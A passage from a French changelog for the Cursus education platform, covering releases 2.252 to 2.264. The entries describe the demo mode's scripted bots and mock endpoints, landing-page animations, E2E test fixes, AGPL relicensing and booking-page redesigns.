  persona pour la coherence de caractere.
- `src/landing/grammar.js` : version browser (IIFE) chargee avant app.js,
  expose `window.CursusGrammar`. Le chat de la landing genere une 4e
  ligne via grammar a chaque switch de canal — combinatoire elargie.

**Anti-drift** : test `tests/backend/demo/grammar.test.js` evalue le
fichier landing dans un contexte fake-window et compare cle a cle les
VOCAB et TEMPLATES avec la version serveur. Si quelqu un edit l un sans
l autre, le test echoue.

8 nouveaux tests (62 demo total, +8). Bump 2.263.0 -> 2.264.0.

## v2.263.0 (2026-04-28)

### Landing : algorithmes pour rendre les demos plus credibles

7 algos JS pour passer de "demo scriptee" a "demo qui simule un vrai
systeme". Tout est dans `src/landing/app.js` avec une section
ALGORITHMES en tete (helpers reutilisables).

**Helpers** : `mulberry32` (PRNG seede), `easeOutCubic` /
`easeInOutCubic`, `levenshtein` + `fuzzyScore`, `seededRandomWalk` +
`buildSparklinePath`, `pickBiased`, `buildMarkov` + `markovWalk`.

**Live Quiz : poll progressif**. Avant : barres statiques affichant la
distribution finale immediatement. Apres : 0% au start, puis votes qui
arrivent par paquets de 1-2 toutes les 400ms via `pickBiased(q.stats)`.
Le compteur "X reponses" monte en temps reel, la majorite emerge
progressivement, le reveal final snap aux vraies valeurs. Effet
"Wooclap en classe".

**Bento counters animes**. Les pills `3 en ligne`, `42 fichiers`,
`13 RDV`, `28 reponses` ne sont plus statiques : drift aleatoire
toutes les 5-12s avec interpolation easing cubic sur 600ms. La
"28 reponses" du bandeau Live tick toujours up (effet Live qui se
remplit). Jitter sur les intervals pour eviter les synchros.

**Bento sparkline (Devoirs)**. Random walk seedee par jour-de-l'annee
-> mini-courbe SVG "activite 14j" avec gradient + stroke anime
(stroke-dashoffset). Stable dans la session, change quotidiennement.

**RDV : creneaux generes par heuristique**. Plus de slots hardcodes.
`generateRdvWeek()` utilise un PRNG seede sur le jour-de-l'annee :
- Pas avant 9h ni apres 17h
- Mer apres-midi exclu (cours)
- Densite par jour (Lun/Jeu plus libres, Mer creux)
- Densite plus forte le matin que l'apres-midi

Chaque visite affiche une grille differente mais plausible.

**Docs : recherche fuzzy (Levenshtein)**. Avant : `tags.includes(q)`
exact. Apres : si pas de match exact, on teste contre chaque mot des
tags + nom via `fuzzyScore < 0.35` (Levenshtein normalisee). Tape
"algri" -> trouve "algo", "reso" -> "reseaux".

**Pulse word cloud : layout force-directed**. Avant : wrap CSS lineaire.
Apres : algo de placement avec repulsion entre boites + attraction vers
le centre + 80 iterations. Les mots ne se chevauchent plus, les plus
gros restent au centre. Rendu type wordcloud.js mais en 60 lignes.

**Chat : Markov bigrammes**. Corpus de 15 messages reels, 35% de
chance qu'un clic sur un canal ajoute un message Markov-genere a la
fin (auteur pioche dans l'historique, timestamp en temps reel). La
conversation ne montre jamais 2 fois exactement le meme historique.

Bump 2.262.0 -> 2.263.0.

## v2.262.0 (2026-04-28)

### Demo : bots intelligents + widgets presets + fix slice crash

**Bots V5 : reactivite au visiteur + personnalites stables**.
Les bots ne postent plus dans le vide, ils repondent au visiteur :

- **Tier 1 - Reactivite** : si Emma poste un message dans les 90s, un
  bot lui repond avec `@Emma` (probabilite 70%) + un autre lui ajoute
  une reaction emoji contextuelle (55%). 8 templates regex matchent
  sur "merci", "?", "code block", "salut", etc. Sinon ack courts.
- **Tier 2 - Personnalites** : 7 personas stables (Lucas pragmatique,
  Sara curieuse, Mehdi serviable, Alice organisee, Jean senior, Hugo
  discret, Lea posee). Chaque persona a ses canaux preferes et ses pools
  short/medium/long/questions — la conversation devient lisible, on
  reconnait qui parle.
- **Tier 3 - Realisme** : variance de longueur (50% court, 35% medium,
  15% long), awareness time-of-day (la nuit on poste rarement, le matin
  les messages sont plus courts).
- **Tier 4 - Polish** : edits realistes (vraies corrections via 8
  EDIT_PATTERNS comme `du cou` -> `du coup`, `vraimt` -> `vraiment`),
  bursts (10% chance d'enchainer 3 actions ce tick), reactions
  contextuelles (heuristique pickEmojiForContent : merci -> 🙏, code -> 🔥,
  question -> 🤔, lien -> 💡, etc.).

stats runOnce() retourne maintenant `{ sessions, posted, replied,
reactedVisitor, reacted, edited }`.

**Widgets demo curatee par role**. Le bento etudiant et prof affiche
desormais une selection de widgets dont les donnees sont reellement
seedees (3 devoirs avec deadlines, session Live "Quiz Algo" en cours,
50 messages, ~30 students). Evite les empty states.

- Etudiant : echeances 2x2 + live + messages + livrables + weekplanner
  + project + rendus + countdown + promoActivity
- Prof : focus 2x2 + 4 stats 1x1 + agenda-jour 2x2 + messages + actions
  + activity 4x1 + feedback-templates + at-risk + schedule

`useBentoPrefs.applyDemoPreset()` et `useTeacherBento.applyDemoPreset()`
appliques par `DemoLandingView` apres `appStore.login` selon le role.

**Fix demo crash : `ke.slice is not a function`**. Plusieurs widgets
appelaient `data.notes.slice()`, `data.history.slice()` etc. mais le
wildcard demo retournait `[]` au lieu de `{ notes: [] }`. Ajout de
mocks dedies pour les endpoints qui retournent un objet imbrique :

- /lumen/my-notes -> `{ notes: [] }`
- /lumen/repos/:id/read-counts -> `{ counts: [] }`
- /lumen/read-counts/promo/:id -> `{ counts: [] }`
- /lumen/stats/promo/:id -> `{ repos: 1, reads: 14 }`
- /typerace/me -> `{ allTime, today, week, history }`
- /typerace/leaderboard -> 3 fake rows
- /assignments/gantt -> `{ tasks: [], links: [] }`
- /assignments/rendus -> `[]`
- /groups, /groups/:id/members -> `[]`
- /promotions/:id/channels/archived -> `[]`
- /modules -> tous les modules actives par defaut

**Tests bots refactores** : 17 tests (avant 9), couvrent les nouvelles
actions reply/react-visitor + heuristique pickEmojiForContent + edits
realistes. Total tests demo : 36 -> 54.

Bump 2.261.0 -> 2.262.0.

## v2.261.0 (2026-04-28)

### Demo : split modulaire + 45 tests + bots react/edit

Refacto pour rendre la demo maintenable a long terme. Trois axes :

**Split de `server/routes/demo.js`** (450 lignes -> 4 fichiers thematiques).
La god-route est devenue `server/routes/demo/` avec :
- `index.js` : router racine, POST /start, POST /end, mount middleware
- `real.js` : endpoints qui lisent/ecrivent demo_* (promotions, channels,
  messages, presence, status, teachers, pinned)
- `mocks.js` : 30+ fallbacks hardcoded (booking, documents, live, lumen,
  kanban, signatures...) + wildcard final
- `README.md` : how-to ajouter un mock + diagramme du dispatch

Gain : ajouter une feature ne necessite plus de naviguer dans 450 lignes.
Le wildcard log toutes les hits via `console.warn` (visible en CI dans
les logs Playwright) — futurs candidats pour un mock dedie. Mode strict
`DEMO_STRICT=1` : le wildcard retourne 501 au lieu de [], pour que les
trous deviennent visibles en CI plutot que silencieux.

**Tests demo** : 0 -> 45 (`tests/backend/demo/`).
- `seed.test.js` (14 tests) : currentUser shape student/teacher, 2 promos,
  4 channels, 30+ students, 30+ messages avec reactions JSON parseables
  + 3+ pinned + 0 orphelin, 3 assignments avec deadlines futures, isolation
  cross-tenant
- `routes.test.js` (22 tests) : POST /start ok, demoMode rejette token
  manquant/invalide, /promotions /channels /messages persistent + isolent,
  POST /messages persiste avec author_name correct, refuse content vide /
  > 10k chars, /presence et /status retournent les bons compteurs,
  wildcard 404 retourne []/403 selon methode, DEMO_STRICT=1 -> 501,
  /end purge et invalide les requetes ulterieures
- `bots.test.js` (9 tests) : Math.random mocke pour declencher chaque
  action, chaque type (post/react/edit) verifie individuellement,
  idempotence (re-react = no-op), exclusion des messages > 30min de la
  cible react, sessions expirees ignorees

**Bots demo plus malins** (`server/services/demoBots.js`).
- Avant : 1 action par tick (POST 30%)
- Apres : 3 actions independantes par tick :
  - POST 30% — un bot poste un message dans un canal
  - REACT 20% — un bot ajoute une reaction emoji a un message des 30
    dernieres minutes (10 emojis : 👍 ❤️ 🎉 😂 🤔 🔥 💡 🙏 ✅ 👀),
    idempotent par user
  - EDIT 8% — un bot edite un de SES messages des 5 dernieres minutes,
    append un suffixe `(edit : typo)` et set edited=1

La conversation evolue maintenant : reactions sur messages recents,
typos corrigees, plus juste un fil monotone. Stats `runOnce()` retournent
{ sessions, posted, reacted, edited }.

`tests/backend/demo/bots.test.js` couvre les 3 actions individuellement
avec Math.random mocke pour rendre les tests deterministes.

Total tests projet : 1600 -> 1645.
Bump 2.260.0 -> 2.261.0.

## v2.260.0 (2026-04-28)

### Demo : seed riche + mission tracker + nav badges + landing polish

Resout le "cold start problem" du mode demo (le visiteur arrive sur le
dashboard et ne sait pas quoi faire) et polit la landing.

**Tier 2 - Seed enrichi** : le seed demo passe de ~20 messages a ~50,
avec markdown (gras, code blocks YAML/Python, mentions @user, listes),
reactions emoji (joins JSON), 5 messages epingles, threads coherents
sur le projet web E4 (auth argon2/bcrypt, CORS debug, GitHub Actions).
Les canaux #developpement-web et #algorithmique sont les plus denses
(c'est la qu'un visiteur etudiant va naturellement). Endpoint
`/messages/pinned/:channelId` lit maintenant `is_pinned=1` au lieu de
retourner `[]`. Une session Live "Quiz Algo - Arbres AVL" en cours
+ historique de 3 sessions passees + 7 documents (PDF cours, DOCX TPs,
notebook, lien GitHub, viz AVL externe) sont retournes par les
endpoints demo correspondants.

**Tier 3 - Mission tracker (DemoBanner v2)** : le bandeau decoratif
devient un suivi de decouverte. Pill `X/5 decouvertes` cliquable
(halo pulse tant que < 5/5) ouvre un dropdown avec les 5 etapes :
dashboard, messagerie, Lumen, devoirs, live ou RDV. Detection
automatique via `router.afterEach` (pas de hooks a poser dans 20
composants) — visiter `/lumen` coche automatiquement l'etape Lumen.
Persiste dans localStorage `cc_demo_mission`. A 5/5, animation wiggle
+ celebration + CTA "Creer un compte gratuit". Composable
`useDemoMission` reutilisable, IDs typed.

**Tier 3 - Nav badges "A essayer"** : dot vert pulsant sur les
onglets NavRail pas encore visites en mode demo (Messagerie, Lumen,
Devoirs, Live). Disparait au 1er clic via la mission auto-cochee.
Couleur accent (vert) pour eviter la confusion avec le live-dot rouge.

**Landing - Smooth scroll bento -> feature** : clic sur une carte
bento scrollt avec offset nav (~70px) au lieu d'un saut net, puis
halo color anime sur la mini-demo cible (1.5s) pour materialiser
"tu es la maintenant". Hook applique a tous les liens internes
(#feat-*, #features, #faq, #download). Respecte
`prefers-reduced-motion`.

**Landing - FAQ moderne** : passe d'une liste austere
(border-top/bottom hairlines) a un design cards :
border-radius 14px, padding genereux 18px/22px, indicateur chevron
dans pastille douce (rotation 180deg a l'ouverture), barre d'accent
verticale 3px sur la reponse + fond bleu tres pale, code/em
restyles (badges arrondis), liens avec underline thicker. Ombre
douce a l'ouverture pour separer visuellement.

Bump 2.259.0 -> 2.260.0 (minor : nouvelles features visibles).

## v2.259.0 (2026-04-28)

### Landing : bento enrichi + Live multi-modes + docs filtrables + RDV bookable

Plus de fonctionnalites visibles, plus joli, plus reel. Cinq blocs d'amelioration
des demos de la landing pour montrer ce que fait vraiment Cursus :

**Bento (hero)** : indicateurs de vie sur chaque carte. Chat affiche `3 en ligne`
+ message "Jean ecrit…" anime. Devoirs montre `2/3` + barre de progression 67%.
Ressources passe a 6 docs avec compteur `42`. Live a un badge `LIVE` pulsant +
"28 reponses · 0:12". RDV affiche `13 rdv` cette semaine + un creneau marque
reserve + ligne `Outlook + Teams`. Lumen a un compteur de chapitres + barre de
progression de lecture + LaTeX inline `O(n·log n)`.

**Live demo : 4 modes en rotation auto** (12s, pausable au hover). Spark (quiz
existant), Pulse (sondage anonyme avec nuage de mots cycle + barres
d'humeur, 22 reponses), Code (editeur partage avec 3 curseurs MR/EL/JD,
ligne mise en surbrillance, caret clignotant), Board (5 post-its de retro
sprint avec votes, top vote outline rouge). Tabs cliquables pour forcer le
mode, badge `LIVE REC` rouge dans la titlebar.

**Docs demo : recherche reelle qui filtre**. La recherche tape successivement
`algo`, `reseau`, `.pdf`, `tp`, ` ` et filtre vraiment les 9 fichiers via
data-tags. Categories cliquables (Tous / Cours / TP / Externe) avec compteurs.
Empty state si aucun match. Items disparaissent avec une transition douce,
pas de jump.

**RDV demo : reservation de creneau**. Clic sur un creneau libre dans
l'onglet Disponibilites -> creneau marque vert avec coche, compteur du footer
decremente, toast inline confirme `RDV reserve · Lun 09:00 / Lien Teams envoye
par email` puis se dissipe.

**Lumen : barre de progression de lecture**. Sous le contenu, une barre fine
qui se remplit selon le chapitre (Tri rapide 42% / Graphes 18% / Dyn 73%),
avec shimmer anime + label `42% lu` dans le footer.

Tous les nouveaux elements respectent prefers-reduced-motion et sont
keyboard-accessibles.

## v2.258.2 (2026-04-28)

### Fix : mode demo se faisait deconnecter immediatement (vraie cause E2E)

Les v2.258.0 et .1 attaquaient les symptomes (DemoBanner pas visible,
cc_session vide en CI) sans voir la cause. Le trace Playwright local le
montre clairement : juste apres `POST /api/demo/start`, le shell appelait
`getTeachers()` qui touche `/api/auth/teachers`. Le `rewriteDemoPath` du
shim web exemptait *toutes* les routes `/api/auth/*` du rewrite, donc le
token demo etait envoye au middleware d'auth prod qui le rejette -> 401
-> evenement `cursus:auth-expired` -> `appStore.logout()` -> cc_session
removed -> `LoginOverlay` reaffichee.

Resultat : les tests demo voyaient bien la POST /start passer, l'URL
basculer en /dashboard, mais 50ms plus tard l'utilisateur etait remis sur
le login. cc_session etait null, le DemoBanner n'avait jamais existe.
Reproductible en local, pas seulement en CI.

Fix dans `src/web/api-shim.ts` : on distingue les vraies routes d'auth
(`/api/auth/{login,register,refresh,change-password,logout}`) — gardees
telles quelles — des routes de fetch sous le prefixe `auth/`
(`/api/auth/teachers`, `/api/auth/identities`, `/api/auth/find-user`)
qui sont rewritees en `/api/demo/*` comme le reste de l'API.

Tests E2E : 7 passing (avant : 5 passing + 2 failed).

## v2.258.1 (2026-04-28)

### Fix CI : tests E2E demo via localStorage plutot que DOM banner

Les 2 tests "demarrage demo etudiant/enseignant" continuaient a flaker en
CI malgre le hardening v2.258 (waitForSelector + waitForResponse). Le
serveur repondait bien (POST /api/demo/start ok), la nav vers /dashboard
fonctionnait, mais l'assertion `text=/Mode demonstration/i` sur le
DemoBanner timeoutait (15s, element non trouve).

Cause probable : le DemoBanner est dans App.vue mais son `v-if="isDemo"`
depend de la reactivite Pinia qui peut prendre plusieurs frames a
propager apres `appStore.login()` + `router.replace('/dashboard')` en
CI (chunks lazy + Chromium charge). Pas reproductible en local.

Fix pragmatique : on remplace l'assertion DOM par une verification de
localStorage `cc_session.demo === true` via `expect.poll`. C'est ce que
prouve la session demo cote source de verite (le DOM en est une
projection). `appStore.login()` ecrit sync dans localStorage, donc plus
de race condition. Le DemoBanner reste teste manuellement.

Tests E2E : 5 passing visent (avant : 5 passing + 2 failed).

## v2.257.0 (2026-04-28)

### Mode demo jalon V2 + relicensing AGPL v3

**Mode demo (jalon V2)** : la sandbox sans inscription livree en MVP
v2.256 prend de l'epaisseur. Le visiteur explore maintenant l'app
entiere sans crash, avec une promo qui prend vie en arriere-plan.

- **Bots scriptes** (`server/services/demoBots.js`) : worker leger qui
  scanne les sessions actives toutes les 60s et, avec 30% de probabilite
  par tick, fait poster un message plausible par un des 6 etudiants
  fictifs. Pool de phrases ciblees par canal (general / dev-web / algo
  / projets) — l'utilisateur voit du mouvement sans intervention. Skip
  auto en NODE_ENV=test, pilotable via `runOnce()` pour les tests.

- **Cron de purge** (`server/services/demoReset.js`) : tourne toutes les
  heures, supprime tenants + sessions dont le JWT a expire (TTL 24h).
  Pas de cron lib (un setInterval suffit) ; en V3 on alignera sur
  04h00 Paris si besoin.

- **Demo independante du compte courant**. Avant : si un visiteur etait
  deja loggue avec son vrai compte, /demo le redirigeait silencieusement
  vers son dashboard reel — la demo etait inaccessible aux comptes
  actifs. Maintenant : la session reelle est sauvegardee dans
  `cc_session_backup` au lancement, restauree quand le visiteur clique
  "Revenir a mon app" dans le DemoBanner. Les deux sessions sont
  strictement independantes — un prof peut comparer son experience
  reelle et la demo cote a cote.

- **Routes demo elargies** + **fallback wildcard**. Ajout de 25
  endpoints "lecture vide" (booking, documents, bookmarks, signatures,
  teachers, DMs, lumen, kanban, calendar, etc.) pour que les pages du
  frontend ne crashent pas en demo. Plus un fallback global : tout
  endpoint non explicitement defini retourne `{ ok: true, data: [] }`
  pour les GET et `{ ok: false, error: 'demo_unsupported' }` pour les
  ecritures. Le frontend voit l'empty state naturel sans erreur reseau.

- **Test E2E** : ajout d'un cas `endpoints non couverts retournent un
  fallback (pas de 404)` qui verifie le wildcard. 4/4 tests demo passent
  en 13.5s. Pour la suite : V3 ajoutera la presence Socket.IO fake et
  les bots qui apparaissent en `online` dans la liste des etudiants.

**Relicensing MIT -> GNU AGPL v3** : Cursus est deploye comme service
web (app.cursus.school) en plus du code source. MIT et Apache 2.0 ne
couvrent pas le cas SaaS — une EdTech pourrait fork, ajouter des
features proprietaires, et le revendre en SaaS a des ecoles sans
publier ses modifications. AGPL v3 oblige les operateurs reseau a
publier leurs changes sous la meme licence.

Trade-off accepte : peut faire fuir les ecoles privees qui veulent
integrer Cursus a leur SI proprietaire ferme. Pour ce cas, un dual
licensing pourra etre envisage plus tard.

Le LICENSE est maintenant le texte AGPL v3 officiel (verbatim depuis
gnu.org), donc detecte proprement par GitHub via licensee. Toutes les
mentions MIT migrees : package.json (SPDX `AGPL-3.0-or-later`),
README, SettingsAbout, landing FAQ + footer.

**Landing modernisee** :

- Hero CTA repense : "Tester en demo · sans inscription" en bouton
  primaire, "Ouvrir l'app" en secondaire, "Telecharger" en lien tertiaire.
- Nouvelle section "Pour qui ?" avec 2 cards (Enseignants + Etudiants),
  5 points specifiques chacune, CTA dedie vers /demo.
- FAQ avec 8 questions (gratuit, donnees privees, demarrage, vs
  Moodle/Teams, auto-hebergement, fonctionnement demo, mainteneur,
  signaler bug). Format `<details>` natif zero JS.
- Polish des demos : timer Spark Quiz qui pulse rouge les 5 dernieres
  secondes + reveal auto si timeout. Reactions chat sans emoji (SVG
  lucide thumbs-up / party-popper / lightbulb) pour aligner sur la
  regle no-emoji du projet.
- Cache buster `?v=257` sur style.css et app.js (correctif urgent
  apres rapport "CSS casse" — un cache browser servait l'ancien fichier).
- Bio Rohan corrigee : "Enseignant Responsable Pedagogique en
  Informatique au CESI de Montpellier" (au lieu de "etudiant ingenieur").

**Tests demo** : 4/4 E2E passent (13.5s).

- /login -> lien -> /demo affiche les 2 choix
- demarrage etudiant -> dashboard + bandeau visible
- demarrage enseignant -> session prof avec bandeau
- endpoints non couverts retournent un fallback ok+vide

## v2.256.1 (2026-04-28)

### Restaure le Proxy `window.api` perdu en v2.255.1

Regression silencieuse introduite par la refacto `SILENT_FALLBACKS` du
commit precedent : le bloc final `;(window as ...).api = new Proxy(apiImpl, ...)`
a ete remplace accidentellement par un simple commentaire. Resultat dans
le build web : `window.api` etait `undefined`, tout appel
`window.api.X()` crashait avec "Cannot read properties of undefined".

Pas detecte plus tot car :

- L'app Electron n'utilise pas ce shim (le preload Electron pose son
  propre `window.api`, donc le bug etait invisible en local desktop).
- Le test E2E `connecte un enseignant` passait par accident — sa seule
  assertion `toHaveURL(/dashboard/)` matchait avant meme le click submit
  (la route `/` redirige vers `/dashboard` via le router).
- Le test E2E `refuse un login invalide` exposait reellement le bug : le
  `catch` de `useLoginForm` affichait `String(e)` =
  `"Cannot read properties of undefined (reading 'loginWithCredentials')"`,
  qui ne contenait aucun de `erreur|invalide|incorrect`, d'ou l'echec du
  selector du test.

**Fix complementaire : `linkPreview.js` rate-limit IPv6.**

`ERR_ERL_KEY_GEN_IPV6` etait throw par `express-rate-limit` v8+ quand un
`keyGenerator` custom referencait `req.ip` sans utiliser le helper
`ipKeyGenerator`. La validation est swallow par la lib (catch +
`console.error`) donc le serveur tournait quand meme, mais ca polluait
les logs CI a chaque boot. Aligne le pattern avec les autres limiters
(`auth.js`, `messages.js`, `scheduled.js`) : `req.user?.id ?? 'anon'`.

Verifie en local avec `npm run build:web` + Playwright contre le serveur
prod : test `refuse un login invalide` passe en 4.9s.

## v2.256.0 (2026-04-28)

### Sidebar Rendez-vous + retrait de l'EmptyState plein ecran

**Nouvelle `SidebarBooking.vue`** branchee sur la route `booking` (ajout
d'une branche `v-else-if="route.name === 'booking'"` dans `Sidebar.vue`).
Affiche en compact ce qui prenait toute la place avant la promotion en
route top-level (cf. v2.253) :

- Statut Microsoft (cliquable -> ouvre Settings)
- Grille 2x2 de stats : Types actifs, RDV cette semaine, En attente,
  Campagnes (actives + drafts en suffixe)
- Liste des 5 prochains RDV avec date relative (`dans 30 min`, `demain
  14:00`) et lien visio direct
- Action rapide "Nouveau type de RDV" avec raccourci `Ctrl+N`

Communication sidebar -> page via `CustomEvent('cursus:booking-create-type')`
ecoute dans `TabBooking`. Pas de couplage par store/props — un event
suffit pour ce one-shot.

**Retrait du gros EmptyState dans `CampaignManager.vue`** : l'ancien
bloc pleine largeur "Aucune campagne pour le moment" + bouton "Creer ma
premiere campagne" faisait doublon avec le header (qui contient deja le
bouton "Nouvelle campagne") et avec la sidebar. Remplace par un placeholder
discret qui pointe vers le bouton du header.

## v2.255.1 (2026-04-28)

### Bruit console + CSP Pyodide

**`api-shim` web : warn -> debug.** Les warnings
`[api-shim] window.api.X() not implemented in web build — using no-op`
passent de `console.warn` a `console.debug`. Toujours visibles via
DevTools en niveau verbose, mais sans polluer la console par defaut. Les
methodes pure-Electron (`setBadge`, `clearBadge`, `onRuntimeError`,
`onPollUpdate`, `onStatusChange`, `offlineWrite`) sont en plus passees
dans une `SILENT_FALLBACKS` qui les rend totalement silencieuses : ce
sont des features OS-only qui n'auront jamais de version web, c'est
attendu.

**CSP Pyodide.** Ajout de `'unsafe-eval'` + 3 hashes sha256 pour les
`<script>` inline injectes par Pyodide au bootstrap. Sans ca le runner
`.ipynb` de Lumen ne demarrait pas en version web (kernel Python
crashait au boot avec violations `script-src-elem`). Les hashes sont
stables tant qu'on ne bump pas `PYODIDE_VERSION` dans `usePyodide.ts` —
sinon a regenerer depuis les warnings console.

**Pas resolu** dans cette release : `Error: tooltipContainer does not
exist` qui vient d'un bundle vendor minifie qu'on n'a pas pu localiser
sans source maps actifs.

## v2.255.0 (2026-04-28)

### Vue de demarrage configurable + fixes blocs code et v-memo polls

**Nouvelle preference `startView`** (Settings > Preferences > "Au
demarrage") avec 3 choix :

- "Reprendre ou j'etais" (default — pattern Discord/Slack)
- "Toujours le tableau de bord"
- "Toujours les messages"

Le router persiste la derniere route visitee dans `localStorage` via
`afterEach` (chemin + query, hors routes publiques `/book/...`).
`resolveStartRoute()` est appelee dans `App.vue` a la restauration de
session.

**Note technique** : la derniere route est snapshotee a l'import du
module router (pas a l'appel de `resolveStartRoute`) car la premiere
navigation `/` -> redirect `/dashboard` ecraserait l'entree
`localStorage` avant que `App.vue` ait pu la lire. Le router guard reste
authoritative pour les routes inaccessibles (role / module insuffisant).

**Fix bloc de code (markdown).** Le fond etait `rgba(0, 0, 0, .32)` qui
en dark theme sur `--bg-main: #1a1b1d` donnait un noir a peine plus
fonce que le chat — le bloc se confondait visuellement avec le fond.
Utilise maintenant `var(--bg-elevated)`, plus contraste et coherent avec
le header. En light theme, look "carte" comme GitHub / Notion.

**Fix `v-memo` MessageBubble.** `msg.poll_votes` est maintenant trackee.
Avant, un vote arrivant en live (websocket) n'invalidait pas le memo, le
`PollRenderer` ne se rerendait donc pas tant qu'autre chose ne changeait
pas dans le message.

## v2.254.1 (2026-04-28)

### Pills de date qui s'empilent + checkbox tasklist en input text

**Pills de date sticky qui s'empilent au scroll.** Tous les
`.date-separator` etaient des freres directs du meme container scroll, et
un `position: sticky` qui sort du flow ne pousse pas le precedent — il
s'empile dessus. Resultat visible : 3 pills empilees en haut quand on a
3 jours de messages.

Fix : chaque jour est maintenant enveloppe dans un
`<section class="date-group">` qui sert de contexte de scoping au
sticky. Quand on sort du jour, le wrapper sort et la pill avec lui.

**Checkbox tasklist GFM rendue comme un grand rectangle blanc.**
L'`<input>` perdait son attribut `type="checkbox"` quelque part dans le
pipeline `marked -> regex -> DOMPurify`, le browser le rendait donc en
`<input type="text">` par defaut.

Fix robuste : on regenere l'input from scratch dans le replace au lieu
de bricoler les attrs sources (`html.ts`), ce qui garantit
`type="checkbox"` inconditionnel. Tolere aussi un eventuel attribut sur
le `<li>` source au cas ou marked changerait son output.

## v2.254.0 (2026-04-27)

### Apercu visiteur : voir ce que verra l'etudiant

Ajout d'un bouton "Apercu" sur chaque type de RDV et sur chaque campagne
qui ouvre une modale montrant le `BookingFlow` reel tel qu'il apparaitra
a l'etudiant — sans envoyer de mail ni rien enregistrer.

**Nouveaux fichiers :**

- `utils/bookingPreviewSlots.ts` (75 lignes) : generateur de creneaux
  fictifs (jours ouvres, week-ends exclus, heures rondes 9h/10h/14h/15h).
  Adaptatif : 2 creneaux/jour si duree ≥ 90 min, 4 sinon. Format ISO local
  stable independant du fuseau horaire.
- `components/booking/BookingPreviewModal.vue` (180 lignes) : modale qui
  monte le composant `BookingFlow` reel avec les donnees du type / campagne
  ainsi que des slots synthetiques. Banniere "Mode apercu" non-interactive.
  Boutons "Ouvrir le vrai lien" (qui delegue a `window.api.openExternal` si
  Electron, sinon `window.open`) et "Fermer l'apercu". La step de
  confirmation est simulee localement (pas d'appel backend).

**Integration :**

- `TabBookingEventTypes` : nouveau bouton icone Eye sur chaque ligne de
  type, entre le toggle Actif et le bouton Supprimer. Au hover : couleur
  accent. La fonction `openPreview(et)` construit le `BookingFlowInfo`
  depuis l'EventType et passe l'URL publique (uniquement si is_public=1).
- `CampaignManager` : nouveau `UiButton` "Apercu invitation" en tete de la
  rangee d'actions de chaque campagne. Reflete les 2 modes : tripartite
  (avec champs tuteur) ou simple selon `c.with_tutor`.

**Tests (11) :** `bookingPreviewSlots.test.ts` couvre le contrat complet :
nb de creneaux par duree, calcul correct du `end`, exclusion week-end, saut
samedi → lundi suivant, format ISO local, parametre `from`/`startHours`
custom, demarrage depuis aujourd'hui si jour ouvre.

Tests : 1957 passants (+11). Typecheck clean. Lint clean. check:design
clean sur les fichiers modifies.

## v2.253.0 (2026-04-27)

### Promotion de Rendez-vous en onglet top-level

L'onglet "Rendez-vous" du dashboard prof est promu en route top-level
`/booking` avec sa propre entree dans la navigation rail. Justification :
la page est devenue une vraie page d'accueil dediee (stats, callout
prochain RDV, 3 sections, raccourci `Ctrl+N`) et merite un acces 1-clic
au lieu de Dashboard > tab.

**Nouveaux fichiers :**

- `BookingView.vue` (40 lignes) : vue racine qui charge `allStudents` via
  `window.api.getAllStudents()` puis monte `<TabBooking>`. Inclut
  `ErrorBoundary`. Ne tire pas tout `useDashboardTeacher` (allege).

**Routes (`router/index.ts`) :**

- Nouvelle route `/booking`, lazy-load, `meta.requiredRole = 'teacher'`.
  Le route guard existant rejette les etudiants vers `/dashboard`.

**NavRail (`components/layout/NavRail.vue`) :**

- Nouvelle entree `booking` entre `agenda` et `live`, icone `CalendarCheck`,
  libelle "Rendez-vous", `isVisible: appStore.isTeacher`. L'ordre par defaut
  est applique automatiquement aux utilisateurs existants via
  `useNavRailOrder` (les nouveaux items sont appendus a la fin de l'ordre
  sauvegarde sans casser la personnalisation).

**Dashboard prof (`DashboardTeacher.vue`) :**

- Retrait du bouton "RDV" de la barre d'onglets secondaires.
- Retrait du `<TabBooking>` du switch `dashTab`.
- Retrait de `'booking'` des unions de types `DashTabType` et `update:dashTab`.
- Retrait de l'import `TabBooking` et de l'icone `CalendarDays` (devenue
  inutilisee).

**Migration douce (`DashboardView.vue`) :**

- Si l'URL contient `?tab=booking` (ancien lien sauvegarde / bookmark),
  redirige automatiquement vers `/booking` (uniquement pour les profs).
- Watch sur `route.query.tab` qui applique la meme redirection a chaque
  navigation.
- Retrait de `'booking'` du type `DashTab` et de `VALID_TABS`.

Le composant `TabBooking.vue` lui-meme n'est pas modifie : il est juste
monte par `BookingView` au lieu de `DashboardTeacher`.

Tests : 1946 passants. Typecheck clean. Lint clean (warnings preexistants).
check:design clean sur les fichiers modifies.

## v2.252.0 (2026-04-27)

### Refonte UX/UI page d'accueil RDV (cote prof)

`TabBooking.vue` n'etait qu'une top-bar + 3 colonnes. Refait en vraie page
d'accueil avec hierarchie visuelle, contexte immediat et raccourcis pour
le quotidien du prof.

**Nouvelle hierarchie :**

- `UiPageHeader` (composant partage) avec titre + sous-titre + actions a
  droite (pill statut Microsoft + CTA "Nouveau type" avec raccourci
  visualise `Ctrl N`).
- **Stats strip** 4 KPI : "Types actifs (X/Y)" / "RDV cette semaine" /
  "En attente" (alert warning si > 0) / "Prochain RDV" (texte court
  "Aujourd'hui 14h", "Demain 09h" ou date complete).
- **"Prochain RDV" callout** : carte saillante affichee uniquement si un
  RDV est prevu dans les 24 prochaines heures. Inclut titre du type,
  partie prenante, libelle relatif ("Dans 45 min" / "A 14h"), et bouton
  "Rejoindre" direct si une URL visio est attachee.
- CampaignManager + 3 sections (types / disponibilites / mes RDV) en
  dessous.

**Performance :**

- `SkeletonLoader` (composant partage) pendant le fetch initial : 4 cards
  pour la stats strip + 3 listes pour les colonnes. Anim shimmer respectant
  `prefers-reduced-motion`. Remplace le texte "Chargement..." nu.
- Toutes les stats sont des `computed` reactifs (pas de re-calcul au scroll).

**Ergonomie :**

- Raccourci global `Ctrl/Cmd+N` pour ouvrir le formulaire de creation
  (desactive si focus dans un input/textarea pour ne pas bloquer la saisie).
- Filtre de recherche dans la section "Types d'evenements" — affiche
  automatiquement quand 4+ types existent. Filtre par titre OU slug, avec
  bouton X pour effacer et message "Aucun type ne correspond a..." si vide.
- Badges de comptage dans les 3 entetes de section (`{{ count }}` en pill
  a droite du titre) pour situer le volume d'un coup d'oeil.
- Empty state propre dans "Types d'evenements" quand aucun type n'est
  configure (icone + titre + sous-titre, via `EmptyState` partage).
- Pill Microsoft : tone success quand connecte (vert avec point), neutral
  sinon. Cliquable pour ouvrir Settings > Integrations.

**Design system :**

- Tokens partout : `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`,
